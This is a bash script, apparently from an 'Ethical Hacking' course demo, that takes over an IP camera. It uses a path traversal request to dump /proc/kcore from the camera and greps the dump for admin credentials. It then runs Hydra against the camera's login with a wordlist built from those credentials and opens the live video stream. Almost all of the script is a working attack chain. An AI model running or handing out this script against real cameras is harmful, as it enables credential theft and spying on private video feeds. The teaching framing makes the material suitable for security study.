#!/bin/bash
VERT="\\033[1;32m"
NORMAL="\\033[0;39m"
ROUGE="\\033[1;31m"
ROSE="\\033[1;35m"
BLEU="\\033[1;34m"
BLANC="\\033[0;02m"
BLANCLAIR="\\033[1;08m"
JAUNE="\\033[1;33m"
CYAN="\\033[1;36m"

if [ "$3" == "YES" ]
then

echo "> Updtate Repo"
apt-get update && apt-get -y upgrade

echo "> Install Dependencies"
	# To patch awk software
	apt-get -y install gawk

	# For Hydra and getmecamtool
	apt-get -y install build-essential cmake
	apt-get -y install libssl-dev libssh-dev libidn11-dev libpcre3-dev libgtk2.0-dev libmysqlclient-dev libpq-dev libsvn-dev firebird2.1-dev libncp-dev

	# For Script
	apt-get -y install figlet
	echo "done"

	echo "Install Tools"
	echo "Install-hydra"
	wget http://www.thc.org/releases/hydra-8.0.tar.gz
	tar -xzvf hydra-8.0.tar.gz
	cd hydra-8.0/
	./configure
	make
	make install
	cd ..

	echo "done"

	echo "Install-getmecamtool"
	wget https://github.com/rtemharutyunyan/getmecamtool/archive/master.zip
	unzip master.zip
	echo "done"

echo "> Updtate Dependencies"
apt-get update && apt-get -y upgrade
else
	echo "> Install Dependencies-skiped"
fi

echo -e "> $JAUNE"
echo "**********************************************************************"
figlet "ISITECH"
figlet "Ethical Hacking"
echo "**********************************************************************"
echo -e "> $VERT""START HACK""$NORMAL"

echo -e "> $VERT""Path transversal Attack MEMORY DUMP""$NORMAL"
ADDR=$1
PORT=$2
echo "Camera Address : "$ADDR ", Port : " $PORT

echo -e "> $CYAN"
wget $ADDR:$PORT/get_status.cgi && cat get_status.cgi
echo -e "> $NORMAL"
# Pause
read -n1 -r -p "Press any key to continue..." key
tail binary.tmp
lwp-request -m GET -b http://$ADDR:$PORT/ -a /../../../../../../../../../proc/kcore -s > binary.tmp
echo -e "> $VERT""MEMORY DUMP Done""$NORMAL"

# Pause
read -n1 -r -p "Press any key to continue..." key

# Binary to hex readable data
echo -e "> $VERT""HEXDUMP""$NORMAL"
echo -e "> $CYAN"
xxd binary.tmp > data.txt && tail data.txt
echo -e "> $NORMAL"

# Pause
read -n1 -r -p "Press any key to continue..." key

# Mise en forme :
echo -e "> $VERT""ScriptPerl""$NORMAL"
echo -e "> $CYAN"
./ScriptPerl.perl > dataBis.txt && tail dataBis.txt
echo -e "> $NORMAL"

# Pause
read -n1 -r -p "Press any key to continue..." key

# Find admin user :
echo -e "> $VERT""GREP ADMIN""$NORMAL"
grep --color -C 25 -n admin dataBis.txt 
grep -C 20 admin dataBis.txt> dico.txt

# Pause
read -n1 -r -p "Press any key to continue..." key

# Show password admin user :
tail -n+84700 dataBis.txt | head -n20
read -n1 -r -p "Press any key to continue..." key

# Lancement d'hydra pour la récupération du mots de passe :
echo -e "> $VERT""hydra Hack password""$NORMAL"
#hydra -L dico.txt -P dico.txt $ADDR -s $PORT http-get "/videostream.asf?:user=^USER^&pwd=^PASS^&Login=Login:ÉCHEC d'autorisation."
echo -e "> $CYAN"
hydra -l On4r4p -P dico.txt $ADDR -s $PORT http-get "/videostream.asf?:user=^USER^&pwd=^PASS^&Login=Login:ÉCHEC d'autorisation."
echo -e "> $NORMAL"
# Pause
read -n1 -r -p "Press any key to continue..." key

# Connect to the camera :
echo -e "> $VERT""OPEN CAMERA STREAM""$NORMAL"
iceweasel http://$ADDR:$PORT/live.htm &
echo -e "> $VERT""HACK DONE""$NORMAL"

# Pause
read -n1 -r -p "Press any key to continue..." key
